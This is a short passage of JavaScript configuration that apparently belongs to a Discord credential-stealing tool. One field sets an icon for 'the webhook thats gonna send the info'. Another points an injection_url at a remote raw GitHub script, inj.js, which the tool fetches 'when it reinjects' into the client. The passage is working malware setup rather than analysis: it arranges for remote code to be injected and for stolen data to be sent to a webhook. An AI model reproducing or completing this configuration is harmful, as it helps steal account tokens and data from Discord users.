...
const config = {
  ...
  embed_icon: 'https://cdn.discordapp.com/attachments/1040266161528508468/1094173424483577886/Rotating_earth_large.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/Py0x11/Py0x11.github.io/main/inj.js', //injection url for when it reinjects
  /**
